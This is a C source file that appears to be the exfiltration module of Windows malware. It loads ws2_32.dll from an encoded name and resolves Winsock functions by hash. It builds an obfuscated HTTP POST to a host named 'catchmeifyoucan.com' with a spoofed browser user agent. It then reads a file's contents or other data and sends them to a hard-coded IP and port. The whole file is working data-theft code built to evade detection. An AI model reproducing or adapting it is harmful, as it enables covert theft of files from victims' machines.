#include "../include/StringUtils.h"
#include "../include/SendData.h"
#include "../include/MemoryUtils.h"
#include "../include/FileIO.h"
#include "../include/PathOps.h"
#include "../include/ntdll.h"
#include "../include/DllOps.h"
#include "../include/AddrResolution.h"
#include "../include/macros.h"
#include "../include/syscalls.h"
#include "../include/decoding.h"

#include <winsock2.h>

int                 (__stdcall    *WSAStartupFunc)      (WORD, LPWSADATA);
unsigned long long  (__stdcall    *WSASocketFunc)       (int, int, int, LPWSAPROTOCOL_INFOW, GROUP, DWORD);
int                 (__stdcall    *WSAConnectFunc)      (SOCKET,const struct sockaddr*,int, LPWSABUF,LPWSABUF,LPQOS,LPQOS);
int                 (__stdcall    *SendFunc)            (SOCKET,const char FAR*,int, int);

extern unsigned long long hSocket;

int InitConnection() {
        void       *SocketDll   = {0};
        WSADATA     WSAStruct   = {0};
        SOCKADDR_IN SocketAddr  = {0};
        /*the passed argument is just ws2_32.dll encoded*/
        if (SocketDll == NULL) {
            SocketDll       = LoadDll((unsigned short[11]){0x007c, 0x00e5, 0x0033, 0x0090, 0x0061, 0x0037, 0x005b, 0x0065, 0x00cf, 0x0075, 0x0000});
            WSAStartupFunc  = NULL;
            WSASocketFunc   = NULL;
            WSAConnectFunc  = NULL;
            SendFunc        = NULL;
        }

        if (WSAStartupFunc == NULL) {
            WSAStartupFunc      = GetFuncAddress(SocketDll, WSATART);
            WSASocketFunc       = GetFuncAddress(SocketDll, WSASOCK);
            WSAConnectFunc      = GetFuncAddress(SocketDll, WSACONN);
            SendFunc            = GetFuncAddress(SocketDll, SENDHASH);
        }

        if (hSocket == 0) {
            WSAStartupFunc(MAKEWORD(2, 2), &WSAStruct) == 0;
        }
        hSocket = WSASocketFunc(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

        SocketAddr.sin_family       = AF_INET;
        SocketAddr.sin_port         = HOST_PORT;
        SocketAddr.sin_addr.s_addr  = HOST_IP;

        if (WSAConnectFunc(hSocket, (SOCKADDR*)&SocketAddr, sizeof(SocketAddr), NULL, NULL, NULL, NULL) != 0) {
            return -1;
        }
}


void SendData(HANDLE FileHandle, char *name, int DataSize, char *DataSizeAsString, unsigned char *buffer, unsigned char *data, int IsFile) {
    LARGE_INTEGER   wait                = {0};
    int             CurrentBuffSize     = 0;
    int             FinalBufferSize     = 0;

    if (hSocket == -1) {
        return;
    }

/*
    the RequestHeader is just the below buffer encoded using the function in build tools.

    "POST /up HTTP/1.1\r\n
    Host: catchmeifyoucan.com\r\n
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36\r\n
    Accept-Language: en-US,en;q=0.9,ar;q=0.8,fr;q=0.7\r\n
    Content-Type: application/octet-stream\r\n
    Connection: keep-alive\r\n
    Sec-Ch-Ua-Platform: Windows\r\n
    name:" 
*/
    unsigned char RequestHeader[310] = {0x55, 0x9a, 0x57, 0xa3, 0x25, 0x4a, 0x89, 0xd1, 0x2f, 0x59, 0x8b, 0x71, 0x87, 0x48, 0x47, 0x49, 0x44, 0x2b, 0x1b, 0x4f, 0xb0, 0xa1, 0xb9, 0x69, 0x2b, 0x7e, 0xb8, 0x7b, 0x89, 0x90, 0xa5, 0xa6, 0x41, 0x31, 0x72, 0xab, 0xa0, 0x9c, 0x75, 0x5c, 0x8d, 0xa6, 0x92, 0xbe, 0x64, 0x30, 0x5d, 0xac, 0xac, 0xb1, 0x8d, 0xb7, 0x82, 0x6f, 0x46, 
0x52, 0x3a, 0x46, 0x2e, 0x79, 0x9e, 0xa2, 0x9e, 0x99, 0xbc, 0xa5, 0x61, 0x6f, 0x81, 0x47, 0x38, 0x5a, 0x34, 0x58, 0x43, 0x53, 0x6a, 0xad, 0x93, 0x7f, 0x47, 0x5c, 0x3a, 0x7e, 0xa8, 0x70, 0x31, 0x41, 0x42, 0xb0, 0xa0, 0xac, 0x91, 0x90, 0x83, 0xa9, 0x66, 0x99, 0xad, 0x6a, 0x41, 0x5c, 0x41, 0x5b, 0x34, 0x68, 0x24, 0x44, 0x57, 0x87, 
0x5d, 0x98, 0x4e, 0x76, 0x3e, 0x6e, 0xd3, 0x6c, 0xcf, 0x25, 0x62, 0x91, 0x9c, 0x95, 0xb0, 0x57, 0x25, 0x5e, 0x90, 0xb2, 0xa1, 0xaa, 0x95, 0x64, 0x37, 0x5d, 0x3d, 0x5d, 0x31, 0x5d, 0x31, 0x5d, 0x31, 0x4f, 0x62, 0xa5, 0x83, 0xaa, 0x8a, 0xc3, 0x3e, 0x55, 0x48, 0x55, 0x47, 0x48, 0x54, 0x25, 0x15, 0x42, 0xa3, 0x86, 0xa5, 0x95, 0xbf, 
0x56, 0x50, 0xa9, 0x87, 0xbc, 0x87, 0xc4, 0x69, 0xca, 0x3f, 0x55, 0x7a, 0xbe, 0x4b, 0x64, 0x99, 0x39, 0x84, 0xb4, 0x63, 0x84, 0x9b, 0x51, 0x3d, 0x58, 0x46, 0x73, 0xc1, 0x5e, 0x89, 0x96, 0x4c, 0x42, 0x52, 0x4a, 0x74, 0xca, 0x55, 0x92, 0x8d, 0x43, 0x4b, 0x48, 0x33, 0x23, 0x52, 0xa3, 0xa9, 0xa7, 0xa6, 0x92, 0xbe, 0x57, 0x57, 0xca, 
0x98, 0xad, 0x57, 0x3d, 0x64, 0xce, 0x82, 0xca, 0x77, 0xbe, 0x69, 0xcd, 0x84, 0xbd, 0x8f, 0x7c, 0x8d, 0xb4, 0x86, 0xc7, 0x77, 0x9e, 0xb7, 0xa3, 0xb7, 0x92, 0x99, 0x96, 0x51, 0x41, 0x70, 0x85, 0xc7, 0x83, 0xbe, 0x6f, 0xcb, 0x86, 0xbb, 0x91, 0x85, 0x31, 0x7a, 0xc1, 0x6e, 0xcc, 0x41, 0x7a, 0xb4, 0x8d, 0xbb, 0x96, 0x41, 0x31, 0x70, 
0x9b, 0x92, 0x61, 0x4a, 0xa4, 0x59, 0x56, 0xb5, 0x3a, 0x70, 0x9c, 0x9d, 0x99, 0xb5, 0x86, 0xca, 0x87, 0x8d, 0x39, 0x5e, 0xb9, 0x87, 0xb9, 0x7e, 0xd7, 0x8a, 0x69, 0x59, 0xb3, 0x8a, 0xa5, 0x9a, 0x6a, 0x2a, 0x00};

    DecodeString(RequestHeader);

/*
    the ContentLengthField is just the below buffer encoded using the function in build tools.
    "Content-Length: "
*/
    unsigned char ContentLengthField[17] = {0x48, 0xad, 0x9f, 0xb1, 0x9c, 0x9c, 0xb4, 0x61, 0x53, 0xaa, 0x8e, 0xb5, 0x8d, 0xc3, 0x47, 0x4d, 0x00};
    DecodeString(ContentLengthField);

    /*copy the const part of the request which is request head to the allocated buffer*/
    MovMemory(RequestHeader, buffer, len(RequestHeader));

    /*append the file name to its place in the buffer*/
    ConcatString(buffer, name, len(buffer));
    ConcatString(buffer, "\r\n", len(buffer));

    /*append the content size to the buffer then append the file size to the buffer*/
    ConcatString(buffer, ContentLengthField, len(buffer));
    ConcatString(buffer, DataSizeAsString, len(buffer));
    ConcatString(buffer, "\r\n\r\n", len(buffer));

    /*
    get the size of the buffer which contains only the http request for now
    so we can shift buffer pointer to the end
    so we can write the content of the file to the same buffer to make a full http request
    */
    CurrentBuffSize = len(buffer);
    /*shift the buffer pointer to the end of the buffer*/
    buffer += CurrentBuffSize;

    if (IsFile == TRUE) {
        /*if its a file read the content of the file*/
        if (ReadFileY(FileHandle, buffer, DataSize) != 0) {
            return;
        }
    } else {
        /*if its a data move it to the buffer*/
        MovMemory(data, buffer, DataSize);
    }
    /*shift back the pointer to its original place*/
    buffer -= CurrentBuffSize;
    /*get the full size of the buffer with the file content*/
    FinalBufferSize = CurrentBuffSize + DataSize;

    /*send the buffer*/
    if (SendFunc(hSocket, buffer, FinalBufferSize, 0) == SOCKET_ERROR) {
        return;
    }

    /*wait for 1.5s*/
    wait.QuadPart = -1500 * 10000;
    NtWaitForSingleObject((HANDLE)-1, FALSE, &wait);

    FreeMemory(buffer);
}